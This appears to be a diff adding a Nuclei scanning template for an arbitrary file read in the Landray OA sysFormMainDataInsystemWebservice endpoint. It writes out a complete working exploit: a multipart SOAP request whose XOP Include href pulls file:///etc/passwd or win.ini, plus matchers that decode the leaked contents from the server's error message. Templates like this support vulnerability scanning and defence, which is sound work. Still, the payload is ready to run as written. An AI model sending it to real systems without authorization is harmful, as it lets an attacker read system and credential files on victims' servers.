@@ -1,0 +1,70 @@
+id: landray-sysformmaindataInsystemwebservice-fileread
+
+info:
+  name: Landray OA sysFormMainDataInsystemWebservice Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,file-read
+
+variables:
+  r_data_linux:
+    - "file:///etc/passwd"
+    - "file:///c://windows/win.ini"
+
+flow: http(1) && http(2)
+
+http:
+  - id: first-request
+    method: GET
+    path:
+      - "{{BaseURL}}/login.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Com_Parameter"
+
+  - id: file-read-check
+    method: POST
+    path:
+      - "{{BaseURL}}/sys/webservice/sysFormMainDataInsystemWebservice"
+    headers:
+      Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+    body: |
+      ------4upt9dwdca8rtwq9osuz
+      Content-Disposition: form-data; name="a"
+      
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.maindata.xform.sys.kmss.landray.com/">
+      <soapenv:Header/>
+      <soapenv:Body>
+      <web:getData>
+      <arg0>
+      <beginTimeStamp>a</beginTimeStamp>
+      <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="{{r_data_linux}}"/></count>
+      </arg0>
+      </web:getData>
+      </soapenv:Body>
+      </soapenv:Envelope>
+      ------4upt9dwdca8rtwq9osuz--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Unmarshalling Error"
+      - type: regex
+        part: body
+        regex:
+          - "意外的文本 \"(.+)\""
+      - type: dsl
+        dsl:
+          - |
+            contains(base64_decode(regex_find(body, `意外的文本 \"(.+)\"`)), "bit app support") ||
+            matches(base64_decode(regex_find(body, `意外的文本 \"(.+)\"`)), "root:.*:0:0:")
